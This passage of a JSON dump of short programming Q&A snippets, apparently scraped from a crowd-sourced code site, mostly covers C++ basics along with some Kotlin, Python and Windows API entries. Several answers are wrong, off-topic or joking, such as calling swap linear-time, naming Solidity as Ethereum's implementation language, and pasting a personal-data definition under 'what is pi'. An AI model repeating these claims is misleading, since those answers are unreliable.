    "keyword": null,
    "link": null,
    "title": " what is max rand in C++",
    "description": "It is guaranteed that std::rand max value is at least 32767\n",
    "reg_date": "2021-10-12T11:44:24.000Z"
  },
  {
    "id": 4251,
    "keyword": null,
    "link": null,
    "title": " what is meaning of 64 bit integer in c++",
    "description": "64-bit unsigned integer type is used to store only pozitiv whole number.   64-bit unsigned integer and his value range: from 0 to 18446744073709551615\n",
    "reg_date": "2021-10-12T11:44:24.000Z"
  },
  {
    "id": 4252,
    "keyword": null,
    "link": null,
    "title": " what is namespace in c++",
    "description": "A namespace is a declarative region that provides a scope to the    identifiers (the names of types, functions, variables, etc) inside    it. Namespaces are used to organize code into logical groups and to   prevent name collisions that can occur especially when your code base   includes multiple libraries\nNamespaces avoids name collisions bacause of large libraray in c++. This feature was not supported in C\n//namespace is a declarative region to provide scope for identifiers #include <bits/stdc++.h>  using namespace std; //including namespace std for cin and cout //my custom namespace for variables and functions namespace abc {   void fun()   {     cout<<\"Hello world\"<<endl;   }   int x=10; } using namespace abc; int main() {   cout<<10;   fun();   return 0; }\nnamespace Parent {     inline namespace new_ns     {          template <typename T>          struct C          {              T member;          };     }      template<>      class C<int> {}; } \n//Header.h #include <string>  namespace Test {     namespace old_ns     {         std::string Func() { return std::string(\"Hello from old\"); }     }      inline namespace new_ns     {         std::string Func() { return std::string(\"Hello from new\"); }     } }  #include \"header.h\" #include <string> #include <iostream>  int main() {     using namespace Test;     using namespace std;      string s = Func();     std::cout << s << std::endl; // \"Hello from new\"     return 0; } \n",
    "reg_date": "2021-10-12T11:44:24.000Z"
  },
  {
    "id": 4253,
    "keyword": null,
    "link": null,
    "title": " what is operator overloading in c++",
    "description": "// money.h -- define the prototype class Money {    public:       Money & operator += (const Money &rhs); }  // money.cpp -- define the implementation Money& Money :: operator += (const Money &rhs) {    // Yadda Yadda       return *this; }\n#include <iostream>  class ExampleClass {   public:     ExampleClass() {}   \tExampleClass(int ex) {       example_ = 0;     }     int&       example()        { return example_; }     const int& example() const  { return example_; }   \t//Overload the \"+\" Operator   \tExampleClass operator+ (const ExampleClass& second_object_of_class) {     \tExampleClass object_of_class;     \tobject_of_class.example() = this -> example() + second_object_of_class.example();     \treturn object_of_class;   \t}   private:   \tint example_; };  int main() {   ExampleClass c1, c2;   c1.example() = 1;   c2.example() = 2;   ExampleClass c3 = c1 + c2;   //Calls operator+() of c1 with c2 as second_object_of_class   //c3 gets set to object_of_class   std::cout << c3.example(); }\n#include <iostream> #include <string>   class Car { private:     std::string m_make;     std::string m_model;   public:     Car(const std::string& make, const std::string& model)         : m_make{ make }, m_model{ model }     {     }       friend bool operator== (const Car &c1, const Car &c2);     friend bool operator!= (const Car &c1, const Car &c2); };   bool operator== (const Car &c1, const Car &c2) {     return (c1.m_make== c2.m_make &&             c1.m_model== c2.m_model); }   bool operator!= (const Car &c1, const Car &c2) {     return !(c1== c2); }   int main() {     Car corolla{ \"Toyota\", \"Corolla\" };     Car camry{ \"Toyota\", \"Camry\" };       if (corolla == camry)         std::cout << \"a Corolla and Camry are the same.\\n\";       if (corolla != camry)         std::cout << \"a Corolla and Camry are not the same.\\n\";       return 0; }\nBox operator+(const Box&); \n#include <iostream> using namespace std;  class Box {    public:       double getVolume(void) {          return length * breadth * height;       }       void setLength( double len ) {          length = len;       }       void setBreadth( double bre ) {          breadth = bre;       }       void setHeight( double hei ) {          height = hei;       }              // Overload + operator to add two Box objects.       Box operator+(const Box& b) {          Box box;          box.length = this->length + b.length;          box.breadth = this->breadth + b.breadth;          box.height = this->height + b.height;          return box;       }           private:       double length;      // Length of a box       double breadth;     // Breadth of a box       double height;      // Height of a box };  // Main function for the program int main() {    Box Box1;                // Declare Box1 of type Box    Box Box2;                // Declare Box2 of type Box    Box Box3;                // Declare Box3 of type Box    double volume = 0.0;     // Store the volume of a box here      // box 1 specification    Box1.setLength(6.0);     Box1.setBreadth(7.0);     Box1.setHeight(5.0);      // box 2 specification    Box2.setLength(12.0);     Box2.setBreadth(13.0);     Box2.setHeight(10.0);      // volume of box 1    volume = Box1.getVolume();    cout << \"Volume of Box1 : \" << volume <<endl;      // volume of box 2    volume = Box2.getVolume();    cout << \"Volume of Box2 : \" << volume <<endl;     // Add two object as follows:    Box3 = Box1 + Box2;     // volume of box 3    volume = Box3.getVolume();    cout << \"Volume of Box3 : \" << volume <<endl;     return 0; }\nostream &operator<<(ostream &output, const MyClass &myObject) {    output << \"P : \" << myObject.property;   return output;             } \n",
    "reg_date": "2021-10-12T11:44:25.000Z"
  },
  {
    "id": 4254,
    "keyword": null,
    "link": null,
    "title": " what is order in of preeendence in float, int, char, bool",
    "description": "the correct order is: bool<char<int<float yes regarding size of data types bool can only take 0 or 1 as value so it is the smallest char has 1 byte size likewise others\n",
    "reg_date": "2021-10-12T11:44:25.000Z"
  },
  {
    "id": 4255,
    "keyword": null,
    "link": null,
    "title": " what is pi",
    "description": "3.14159265358979323846264338327950288419716939937510582097494459230781640628\ncout << \"pi is 3.14159265359\" << endl;\ninformation that permits the identity of an individual  directly  name, address, social security number telephone number, email address  indirectly  by which an agency intends to identify SPECIFIC individuals  by a combination of gender, race, birth date, geographic indicator,  for the physical or online contacting of a specific individual  in either paper, electronic / other media.\n",
    "reg_date": "2021-10-12T11:44:25.000Z"
  },
  {
    "id": 4256,
    "keyword": null,
    "link": null,
    "title": " what is push() c++",
    "description": "push()         \n",
    "reg_date": "2021-10-12T11:44:25.000Z"
  },
  {
    "id": 4257,
    "keyword": null,
    "link": null,
    "title": " what is require to run min max function on linux in cpp",
    "description": "    std::max(const T& a, const T& b); \n",
    "reg_date": "2021-10-12T11:44:25.000Z"
  },
  {
    "id": 4258,
    "keyword": null,
    "link": null,
    "title": " what is sigsegv error in c++",
    "description": "A SIGSEGV is an error(signal) caused by an invalid memory reference or a segmentation fault. You are probably trying to access an array element out of bounds or  trying to use too much memory.\n",
    "reg_date": "2021-10-12T11:44:26.000Z"
  },
  {
    "id": 4259,
    "keyword": null,
    "link": null,
    "title": " what is stdarg.h used for",
    "description": "\"stdarg.h\" is a header in the C standard library of the C programming language  that allows functions to accept an indefinite number of arguments. It  provides facilities for stepping through a list of function arguments of  unknown number and type. C++ provides this functionality in the header \"cstdarg\".\n",
    "reg_date": "2021-10-12T11:44:26.000Z"
  },
  {
    "id": 4260,
    "keyword": null,
    "link": null,
    "title": " what is syntex for inheritence in c++",
    "description": "class subclass_name : access_mode base_class { //body of subclass };\n",
    "reg_date": "2021-10-12T11:44:26.000Z"
  },
  {
    "id": 4261,
    "keyword": null,
    "link": null,
    "title": " what is the associative property of an operator",
    "description": "Left Associative means we evaluate our expression from left to right  Right Associative means we evaluate our expression from right to left  We know *, /, and % have same precedence, but as per associativity, answer may change:  For eg: We have expression: 4 * 8 / 2 % 5  Left associative:   (4 * 8) / 2 % 5 ==> (32 / 2) % 5 ==> 16 % 5 ==> 1  Right associative:  4 * 8 /(2 % 5) ==>  4 * ( 8 / 2) ==> 4 * 4 ==> 16\n",
    "reg_date": "2021-10-12T11:44:26.000Z"
  },
  {
    "id": 4262,
    "keyword": null,
    "link": null,
    "title": " what is the default include path in ubuntu c++",
    "description": "    gcc -xc++ -E -v - \n",
    "reg_date": "2021-10-12T11:44:26.000Z"
  },
  {
    "id": 4263,
    "keyword": null,
    "link": null,
    "title": " what is the format specifier for dword c++",
    "description": "On a 32 bit compiler, the format specifier which you can use to print the value of DWORD is %lu . You can also use %ld if you want to print the value in decimal format.\n",
    "reg_date": "2021-10-12T11:44:27.000Z"
  },
  {
    "id": 4264,
    "keyword": null,
    "link": null,
    "title": " what is the meaning of life and everything in the universe",
    "description": "Thoughty2 or 42 ==>> Life and Everything in the universe because In The Hitchhiker's Guide to the Galaxy, advanced alien beings create a supercomputer, called Deep Thought, to figure out the answer to the so-called Ultimate Question of Life, the Universe, and Everything. After calculating for 7.5-million years, Deep Thought determined the answer was the number 42.\n",
    "reg_date": "2021-10-12T11:44:27.000Z"
  },
  {
    "id": 4265,
    "keyword": null,
    "link": null,
    "title": " what is this pointer in c++",
    "description": "Every object in C++ has access to its own address through an important pointer called this pointer. The this pointer is an implicit parameter to all member functions. Therefore, inside a member function, this may be used to refer to the invoking object.  Example: #include <iostream> using namespace std; class Demo { private:   int num;   char ch; public:   void setMyValues(int num, char ch){     this->num =num;     this->ch=ch;   }   void displayMyValues(){     cout<<num<<endl;     cout<<ch;   } }; int main(){   Demo obj;   obj.setMyValues(100, 'A');   obj.displayMyValues();   return 0; } \n#include <iostream>  using namespace std;  int main () {    int  var = 20;   // actual variable declaration.    int  *ip;        // pointer variable      ip = &var;       // store address of var in pointer variable     cout << \"Value of var variable: \";     cout << var << endl; //Prints \"20\"     // print the address stored in ip pointer variable    cout << \"Address stored in ip variable: \";    cout << ip << endl; //Prints \"b7f8yufs78fds\"     // access the value at the address available in pointer    cout << \"Value of *ip variable: \";    cout << *ip << endl; //Prints \"20\"     return 0; }\nEvery object in C++ has access to its own address through an important pointer called this pointer.  The this pointer is an implicit parameter to all member functions.  Therefore, inside a member function,  this may be used to refer to the invoking object.  Friend functions do not have a this pointer,  because friends are not members of a class.  Only member functions have a this pointer.\nvoid one() { cout << \"One\\n\"; } void two() { cout << \"Two\\n\"; }   int main() { \tvoid (*fptr)(); //Declare a function pointer to voids with no params  \tfptr = &one; //fptr -> one \t*fptr(); //=> one()  \tfptr = &two; //fptr -> two \t*fptr(); //=> two()  \treturn 0; } \n#include <iostream>  using namespace std; // isualize this on http://pythontutor.com/cpp.html#mode=edit int main() {    double* account_pointer = new double;    *account_pointer = 1000;    cout << \"Allocated one new variable containing \" << *account_pointer       << endl;    cout << endl;     int n = 10;    double* account_array = new double[n];    for (int i = 0; i < n; i++)    {       account_array[i] = 1000 * i;    }       cout << \"Allocated an array of size \" << n << endl;    for (int i = 0; i < n; i++)    {       cout << i << \": \" << account_array[i] << endl;    }    cout << endl;     // Doubling the array capacity     double* bigger_array = new double[2 * n];    for (int i = 0; i < n; i++)    {       bigger_array[i] = account_array[i];    }    delete[] account_array; // Deleting smaller array    account_array = bigger_array;    n = 2 * n;     cout << \"Now there is room for an additional element:\" << endl;    account_array[10] = 10000;    cout << 10 << \": \" << account_array[10] << endl;            delete account_pointer;    delete[] account_array; // Deleting larger array        return 0; }\n// my first pointer #include <iostream> using namespace std;  int main () {   int firstvalue, secondvalue;   int * mypointer; //creates pointer variable of type int    mypointer = &firstvalue;   *mypointer = 10;   mypointer = &secondvalue;   *mypointer = 20;   cout << \"firstvalue is \" << firstvalue << '\\n';   //firstvalue is 10   cout << \"secondvalue is \" << secondvalue << '\\n'; //secondvalue is 20   return 0; }\n",
    "reg_date": "2021-10-12T11:44:27.000Z"
  },
  {
    "id": 4266,
    "keyword": null,
    "link": null,
    "title": " what is thread in c++",
    "description": "sequence of instructions that can be executed concurrently\n",
    "reg_date": "2021-10-12T11:44:27.000Z"
  },
  {
    "id": 4267,
    "keyword": null,
    "link": null,
    "title": " what is throw in c++",
    "description": "#include <stdexcept>  int compare( int a, int b ) {     if ( a < 0 || b < 0 ) {         throw std::invalid_argument( \"received negative value\" );     } }\n//throw \"throws\" an exception.    It is usually used like:  if(something isnt right){   throw somethingee; }  /*(std::)*/cout << somethingee;\n// using standard exceptions #include <iostream> #include <exception> using namespace std;  class myexception: public exception {   virtual const char* what() const throw()   {     return \"My exception happened\";   } } myex;  int main () {   try   {     throw myex;   }   catch (exception& e)   {     cout << e.what() << '\\n';   }   return 0; }\n",
    "reg_date": "2021-10-12T11:44:27.000Z"
  },
  {
    "id": 4268,
    "keyword": null,
    "link": null,
    "title": " what is time complexity of insertion sort",
    "description": "Time Complexity is:  If the inversion count is O(n),  then the time complexity of insertion sort is O(n).  Some Facts about insertion sort: 1. Simple implementation: Jon Bentley shows a three-line C version, and a five-line optimized version[1] 2. Efficient for (quite) small data sets, much like other quadratic sorting algorithms 3. More efficient in practice than most other simple quadratic (i.e., O(n2))  algorithms such as selection sort or bubble sort 4. Adaptive, i.e., efficient for data sets that are already substantially sorted: the time complexity is O(kn) when each element in the input is no more than k places away from its sorted position 5. Stable; i.e., does not change the relative order of elements with equal keys 6. In-place; i.e., only requires a constant amount O(1) of additional memory space Online; i.e., can sort a list as it receives it\n",
    "reg_date": "2021-10-12T11:44:28.000Z"
  },
  {
    "id": 4269,
    "keyword": null,
    "link": null,
    "title": " what is time complexity of min element()",
    "description": "So, according to the link here:  the max_element function is O(n),\\ beacuase it touches at least every bucket of array apparently for all STL containers.\n",
    "reg_date": "2021-10-12T11:44:28.000Z"
  },
  {
    "id": 4270,
    "keyword": null,
    "link": null,
    "title": " what is time complexity of swap function",
    "description": "The Behaviour is Equivalent to:   template <class T> void swap ( T& a, T& b ) {   T c(a); a=b; b=c; }  Syntax : Swap(a,b) // a = Number 1 , b = Number 2  Time Complexity: It makes one constructions and one assignments \t\t\t\t So, Linear O(n) time.\n",
    "reg_date": "2021-10-12T11:44:28.000Z"
  },
  {
    "id": 4271,
    "keyword": null,
    "link": null,
    "title": " what is unordered set in c++",
    "description": "The structure unordered_set uses hashing, and its operations work in O(1) time on average.\n",
    "reg_date": "2021-10-12T11:44:28.000Z"
  },
  {
    "id": 4272,
    "keyword": null,
    "link": null,
    "title": " what language is ethereum written in",
    "description": " Solidity is the primary language on Ethereum as well as on other private blockchains running on platforms that compete with Ethereum, such as Monax and its Hyperledger Burrow blockchain, which uses Tendermint for consensus.\n",
    "reg_date": "2021-10-12T11:44:28.000Z"
  },
  {
    "id": 4273,
    "keyword": null,
    "link": null,
    "title": " what language was c+ written in",
    "description": "Better than my grades\n",
    "reg_date": "2021-10-12T11:44:29.000Z"
  },
  {
    "id": 4274,
    "keyword": null,
    "link": null,
    "title": " what library to mention for swap function in c++",
    "description": "#include<bits/stdc++.h>\n",
    "reg_date": "2021-10-12T11:44:29.000Z"
  },
  {
    "id": 4275,
    "keyword": null,
    "link": null,
    "title": " what s[i]-'0' does",
    "description": "It seems that s is a character array or a pointer to the first  element of a character array. And element s[i] contains a character that represents a digit as for example '5' . To convert this character that for example in ASCII has internal code equal to 53  (while internal code of character '0' is 48) there is used expression  s[i] -'0' that is equivalent to  53 - 48 and equal to number 5\n    '0' - 48     '1' - 49     '2' - 50     '3' - 51     '4' - 52     '5' - 53     '6' - 54     '7' - 55     '8' - 56     '9' - 57\n",
    "reg_date": "2021-10-12T11:44:29.000Z"
  },
  {
    "id": 4276,
    "keyword": null,
    "link": null,
    "title": " what type is this c++",
    "description": "class ClassName {   void foo() {     // here `this` has `ClassName *` type   }    void bar() const {     // here `this` has `const ClassName *` type   } }; \n",
    "reg_date": "2021-10-12T11:44:29.000Z"
  },
  {
    "id": 4277,
    "keyword": null,
    "link": null,
    "title": " what was the piep piper app",
    "description": "cool software\n",
    "reg_date": "2021-10-12T11:44:29.000Z"
  },
  {
    "id": 4278,
    "keyword": null,
    "link": null,
    "title": " whats a lambda",
    "description": "add = lambda a, b : a + b add(3,6) ## 9\nA lambda expression is a short block  of code which takes in parameters and returns a value. Lambda expressions are similar to methods, but they do not need a name and they can be implemented right in the body of a method.  parameter -> expression  To use more than one parameter, wrap them in parentheses:  (parameter1, parameter2) -> expression  Example Use a lamba expression in the ArrayList's  forEach() method to print every item in the list:  import java.util.ArrayList;  public class Main {   public static void main(String[] args) {     ArrayList<Integer> numbers = new ArrayList<Integer>();     numbers.add(5);     numbers.add(9);     numbers.add(8);     numbers.add(1);     numbers.forEach( (n) -> { System.out.println(n); } );   } } \n// C++ program to demonstrate lambda expression in C++ #include <bits/stdc++.h> using namespace std;    // Function to print vector void printVector(vector<int> v) {     // lambda expression to print vector     for_each(v.begin(), v.end(), [](int i)     {         std::cout << i << \" \";     });     cout << endl; }    int main() {     vector<int> v {4, 1, 3, 5, 2, 3, 1, 7};        printVector(v);        // below snippet find first number greater than 4     // find_if searches for an element for which     // function(third argument) returns true     vector<int>:: iterator p = find_if(v.begin(), v.end(), [](int i)     {         return i > 4;     });     cout << \"First number greater than 4 is : \" << *p << endl;           // function to sort vector, lambda expression is for sorting in     // non-decreasing order Compiler can make out return type as     // bool, but shown here just for explanation     sort(v.begin(), v.end(), [](const int& a, const int& b) -> bool     {         return a > b;     });        printVector(v);        // function to count numbers greater than or equal to 5     int count_5 = count_if(v.begin(), v.end(), [](int a)     {         return (a >= 5);     });     cout << \"The number of elements greater than or equal to 5 is : \"          << count_5 << endl;        // function for removing duplicate element (after sorting all     // duplicate comes together)     p = unique(v.begin(), v.end(), [](int a, int b)     {         return a == b;     });        // resizing vector to make size equal to total different number     v.resize(distance(v.begin(), p));     printVector(v);        // accumulate function accumulate the container on the basis of     // function provided as third argument     int arr[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};     int f = accumulate(arr, arr + 10, 1, [](int i, int j)     {         return i * j;     });        cout << \"Factorial of 10 is : \" << f << endl;        //     We can also access function by storing this into variable     auto square = [](int i)     {         return i * i;     };        cout << \"Square of 5 is : \" << square(5) << endl; }\nx = lambda a, b, c, d, e, f: a + b + c + d + e + f print(x(31231, 312, 312, 31, 12, 31))\n",
    "reg_date": "2021-10-12T11:44:29.000Z"
  },
  {
    "id": 4279,
    "keyword": null,
    "link": null,
    "title": " when kotlin",
    "description": "val x = 3 when(x) {     3 -> println(\"yes\")     8 -> println(\"no\")     else -> println(\"maybe\") } // when can also be used as an expression! val y = when(x) {     3 -> \"yes\"     8 -> \"no\"     else -> \"maybe\" } println(y) // \"yes\"\nwhen (x) {     1 -> print(\"x == 1\")     2 -> print(\"x == 2\")     else -> { // Note the block         print(\"x is neither 1 nor 2\")     } }\nfun numberTypeName(x: Number) = when(x) {  0 -> \"Zero\" // Equality check  in 1..4 -> \"Four or less\" // Range check  5, 6, 7 -> \"Five to seven\" // Multiple values  is Byte -> \"Byte\" // Type check  else -> \"Some number\" }\nfun signAsString(x: Int)= when {  x < 0 -> \"Negative\"  x == 0 -> \"Zero\"  else -> \"Positive\" }\n#include<bits/stdc++.h> using namespace std; int main() {   cout<<\"HEllo\"; } \nvar greeting : String ? = null fun main(){ \twhen(greeting){ \t\tnull -> println(\"Hi\")         else -> println(greeting)         }    }\n",
    "reg_date": "2021-10-12T11:44:29.000Z"
  },
  {
    "id": 4280,
    "keyword": null,
    "link": null,
    "title": " when ratings will be updated for codechef",
    "description": "ratings update within 2-3 days after the completion of the contest&hellip;!!!\n",
    "reg_date": "2021-10-12T11:44:30.000Z"
  },
  {
    "id": 4281,
    "keyword": null,
    "link": null,
    "title": " when were smart pointers added in c++",
    "description": "#include <memory> std::shared_ptr<int> foo = std::make_shared<int> (10);\n#include <memory>   void my_func() {     std::unique_ptr<int> valuePtr(new int(15));     int x = 45;     // ...     if (x == 45)         return;   // no memory leak anymore!     // ... }   int main() { }\n",
    "reg_date": "2021-10-12T11:44:30.000Z"
  },
  {
    "id": 4282,
    "keyword": null,
    "link": null,
    "title": " which version c++ single file in sublime is",
    "description": "{  \"cmd\":[\"bash\", \"-c\", \"g++ -std=c++14 -Wall '${file}' -o '${file_path}/${file_base_name}' && '${file_path}/${file_base_name}'\"],  \"file_regex\": \"^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$\",  \"working_dir\": \"${file_path}\",  \"selector\": \"source.c, source.c++\",  \"variants\":  [    {      \"name\": \"Run\",      \"cmd\":[\"bash\", \"-c\", \"g++ -std=c++14 '${file}' -o '${file_path}/${file_base_name}' && '${file_path}/${file_base_name}'\"]    }  ] } \n",
    "reg_date": "2021-10-12T11:44:30.000Z"
  },
  {
    "id": 4283,
    "keyword": null,
    "link": null,
    "title": " while(n--)",
    "description": "for(int i=1;i<=t;i++) { ... } \n",
    "reg_date": "2021-10-12T11:44:30.000Z"
  },
  {
    "id": 4284,
    "keyword": null,
    "link": null,
    "title": " while loop c++",
    "description": "while (true) { // you can also put 1 or true: while (1) \t//do stuff }\ndo {    // codes; } while (testExpression);\nwhile (test_expression) {    // statements     update_expression; }\nwhile (x != 0){ ... }\ndo {    statement(s); } while(condition);\n//Executes a statement repeatedly, until the value of condition becomes false. //The test takes place before each iteration while(condition) {   statement }\n",
    "reg_date": "2021-10-12T11:44:30.000Z"
  },
  {
    "id": 4285,
    "keyword": null,
    "link": null,
    "title": " who made c++",
    "description": "Bjarne Stroustrup\n",
    "reg_date": "2021-10-12T11:44:30.000Z"
  },
  {
    "id": 4286,
    "keyword": null,
    "link": null,
    "title": " who to include a library c++",
    "description": "#include <the name>\n",
    "reg_date": "2021-10-12T11:44:30.000Z"
  },
  {
    "id": 4287,
    "keyword": null,
    "link": null,
    "title": " whole size of the internet",
    "description": "A Lot bigger than you think.\n",
    "reg_date": "2021-10-12T11:44:30.000Z"
  },
  {
    "id": 4288,
    "keyword": null,
    "link": null,
    "title": " why cin take more characters then the size of array in C++",
    "description": "why cin take more characters then the size of array in C++\n",
    "reg_date": "2021-10-12T11:44:30.000Z"
  },
  {
    "id": 4289,
    "keyword": null,
    "link": null,
    "title": " why constructor can't be static in c++",
    "description": "static variable are those variable declared with static and i will be refer to the common property of all the objects in a java and it is mainly used for memory managment in java. constructor is used to inilialize the objects and it is automatically called at time of object creation.  It is not possible in the constructor because static member variables are not associated with each object of the class. It is shared by all objects. If you initialize the static variable into the constructor then it means that you are trying to associate with a particular instance of class. Since this is not possible, it is not allowed.\n",
    "reg_date": "2021-10-12T11:44:30.000Z"
  },
  {
    "id": 4290,
    "keyword": null,
    "link": null,
    "title": " why convert char* to string c++",
    "description": "// example char sczName[] = {\"Jakes\"}; std::string strName = std::string(sczName);  /* SYNTAX #include <string> std::string(<char-to-convert>) */\nchar *cStr = \"C++\"; std::string Str = std::string(cStr);\n#include <iostream> using namespace std;  int main() {   char c = 'l';   string str;   str.push_back(c); }\n",
    "reg_date": "2021-10-12T11:44:31.000Z"
  },
  {
    "id": 4291,
    "keyword": null,
    "link": null,
    "title": " why do men drink liquor",
    "description": "ask your dad\n",
    "reg_date": "2021-10-12T11:44:31.000Z"
  },
  {
    "id": 4292,
    "keyword": null,
    "link": null,
    "title": " why do we need data type in cpp",
    "description": " \t\t\t\t\t\t  Data types in c++ \tBuilt-in                User Defined            Derived     ----------              -----------             ------------     void, int,\t\t\t    structure,              array, \tchar, float,\t\t    union,\t\t\t\t\tfunction,     double, bool,\t\t    enum,\t\t\t\t\tpointer,     long long\t\t\t    class,\t\t\t\t\treference     Wide Character\t\t    typedef\nData Type \t\t\t\t\t\t\t\t\t\tSize int (Integer) = 5, 6, 7\t\t\t\t\t\t\t2 float (Floating Value) = -3.67, 2.67\t\t\t4 double (Double of float) = -7.8746\t\t\t\t8 char (Character) = \t'a', 'b', 'A'\t\t\t\t1 string (Multiple chars) = \"Hello World\" \t\tNo of Chars bool (Boolean) = true, false\t\t\t\t\ttrue = 1, false = 0\nint myNum = 5;               // Integer (whole number) float myFloatNum = 5.99;     // Floating point number double myDoubleNum = 9.98;   // Floating point number char myLetter = 'D';         // Character bool myBoolean = true;       // Boolean string myText = \"Hello\";     // String\ndata type\n",
    "reg_date": "2021-10-12T11:44:31.000Z"
  },
  {
    "id": 4293,
    "keyword": null,
    "link": null,
    "title": " why exceptions can lead to memory leaks",
    "description": "//If an exception is raised between allocation and deallocation, memory leak will occur.  void f1() {     int* ptr = new int;      // do something which may throw an exception      // we never get here if an exception is thrown     delete ptr; }\n",
    "reg_date": "2021-10-12T11:44:31.000Z"
  },
  {
    "id": 4294,
    "keyword": null,
    "link": null,
    "title": " why is my unity crashing",
    "description": "do not destroy your pc\ndestroy your pc\n",
    "reg_date": "2021-10-12T11:44:31.000Z"
  },
  {
    "id": 4295,
    "keyword": null,
    "link": null,
    "title": " why magnetron should be placed inside solenoid",
    "description": "programming \nbyjus \n",
    "reg_date": "2021-10-12T11:44:31.000Z"
  },
  {
    "id": 4296,
    "keyword": null,
    "link": null,
    "title": " why return 0 in int main",
    "description": "//So return 0 just give command to compiler that here code end ... int main() {     cout<<\"Yes\";//->this will print as its before return 0 written.     return 0;     cout<<\"Nope\";//->this will not print as its after return 0 written. }\n",
    "reg_date": "2021-10-12T11:44:31.000Z"
  },
  {
    "id": 4297,
    "keyword": null,
    "link": null,
    "title": " why the << operator is friend",
    "description": "#include <iostream>  class Paragraph {     public:         explicit Paragraph(std::string const& init)             :m_para(init)         {}          std::string const&  to_str() const         {             return m_para;         }          bool operator==(Paragraph const& rhs) const         {             return m_para == rhs.m_para;         }         bool operator!=(Paragraph const& rhs) const         {             // Define != operator in terms of the == operator             return !(this->operator==(rhs));         }         bool operator<(Paragraph const& rhs) const         {             return  m_para < rhs.m_para;         }     private:         friend std::ostream & operator<<(std::ostream &os, const Paragraph& p);         std::string     m_para; };  std::ostream & operator<<(std::ostream &os, const Paragraph& p) {     return os << p.to_str(); }   int main() {     Paragraph   p(\"Plop\");     Paragraph   q(p);      std::cout << p << std::endl << (p == q) << std::endl; } \n",
    "reg_date": "2021-10-12T11:44:31.000Z"
  },
  {
    "id": 4298,
    "keyword": null,
    "link": null,
    "title": " why to use std:: in c++",
    "description": "When you are using \"std::\" it means that you will grap the following command from the \"std\" namespace. The std namespace is an abbreviation for standard  If you use \"std::\" you hvae to include \"#include <iostream>\"\n",
    "reg_date": "2021-10-12T11:44:31.000Z"
  },
  {
    "id": 4299,
    "keyword": null,
    "link": null,
    "title": " why use python",
    "description": "#Hello world in Java: public class Main {     public static void main(String[] args) {         System.out.println(\"hello world\");     } }  #Hello world in Python: print('hello world')  #See?\nNot only that, the salary is higher!!!!!!\n#Hello world in C++  #include <iostream> using namespace std;  int main() {   cout << \"Hello World!\";   return 0; }  #Hello world in python  print('Hello World!')\n",
    "reg_date": "2021-10-12T11:44:31.000Z"
  },
  {
    "id": 4300,
    "keyword": null,
    "link": null,
    "title": " why we use iostream in C++ programming",
    "description": "#include <iostream>\n",
    "reg_date": "2021-10-12T11:44:32.000Z"
  },
  {
    "id": 4301,
    "keyword": null,
    "link": null,
    "title": " why wont a function stop C++",
    "description": "//check location of return statement  //Add return statement after void case '2': \t\tvoid displayInfo(); \t\treturn displayInfo(); \t\tbreak;  //Not after switch closes, as then it will return nevertheless\n",
    "reg_date": "2021-10-12T11:44:32.000Z"
  },
  {
    "id": 4302,
    "keyword": null,
    "link": null,
    "title": " widechartomultibyte",
    "description": "Maps a UTF-16 (wide character) string to a new character string.  The new character string is not necessarily from a multibyte character set.  int WideCharToMultiByte(   UINT                               CodePage,   DWORD                              dwFlags,   _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,   int                                cchWideChar,   LPSTR                              lpMultiByteStr,   int                                cbMultiByte,   LPCCH                              lpDefaultChar,   LPBOOL                             lpUsedDefaultChar );  // Header\tstringapiset.h (include Windows.h)\n",
    "reg_date": "2021-10-12T11:44:32.000Z"
  },
  {
    "id": 4303,
    "keyword": null,
    "link": null,
    "title": " windows forms add kernel32.dll",
    "description": "using System; using System.Runtime.InteropServices; using System.Windows.Forms;  namespace MyWinFormsApp {     static class Program     {         [DllImport( \"kernel32.dll\" )]         static extern bool AttachConsole( int dwProcessId );         private const int ATTACH_PARENT_PROCESS = -1;          [STAThread]         static void Main( string[] args )         {             // redirect console output to parent process;             // must be before any calls to Console.WriteLine()             AttachConsole( ATTACH_PARENT_PROCESS );              // to demonstrate where the console output is going             int argCount = args == null ? 0 : args.Length;             Console.WriteLine( \"nYou specified {0} arguments:\", argCount );             for (int i = 0; i < argCount; i++)             {                 Console.WriteLine( \"  {0}\", args[i] );             }              // launch the WinForms application like normal             Application.EnableVisualStyles();             Application.SetCompatibleTextRenderingDefault( false );             Application.Run( new Form1() );         }     } }\n",
    "reg_date": "2021-10-12T11:44:32.000Z"
  },
  {
    "id": 4304,
    "keyword": null,
    "link": null,
    "title": " windows servis from console app",
    "description": "myservice.exe install -servicename \"MyService\" -displayname \"My Service\" -description \"This is my service.\" \n",
    "reg_date": "2021-10-12T11:44:32.000Z"
  },
  {
    "id": 4305,
    "keyword": null,
    "link": null,
    "title": " wine linux",
    "description": "wget -nc https://dl.winehq.org/wine-builds/winehq.key sudo apt-key add winehq.key \nsudo apt install --install-recommends winehq-staging \nsudo apt install --install-recommends winehq-stable \nsudo apt install --install-recommends winehq-devel \nsudo dpkg --add-architecture i386  \nsudo apt install --install-recommends winehq-stable\n",
    "reg_date": "2021-10-12T11:44:32.000Z"
  },
  {
    "id": 4306,
    "keyword": null,
    "link": null,
    "title": " winmain example",
    "description": "INT WinMain(HINSTANCE hInstance,              HINSTANCE hPrevInstance,              PSTR lpCmdLine,             INT nCmdShow) { \treturn 0; }\nINT WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,     PSTR lpCmdLine, INT nCmdShow) {     return 0; }\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd); \n",
    "reg_date": "2021-10-12T11:44:32.000Z"
  },
  {
    "id": 4307,
    "keyword": null,
    "link": null,
    "title": " winmain function",
    "description": "INT WinMain(HINSTANCE hInstance,              HINSTANCE hPrevInstance,              PSTR lpCmdLine,             INT nCmdShow) { \treturn 0; }\nINT WINAPI WinMain(                     HINSTANCE hInstance, //instance number for the os                     HINSTANCE hPrevInstance, //meaningless parameter used in 16-bit Windows                      PSTR lpCmdLine,  //command-line arguments as unicode string                     INT nCmdShow //flag that says whether the main application window will be minimized, maximized, or shown     \t\t\t ) { \t/* code */     return 0; } \n",
    "reg_date": "2021-10-12T11:44:32.000Z"
  },
  {
    "id": 4308,
    "keyword": null,
    "link": null,
    "title": " worker class c++",
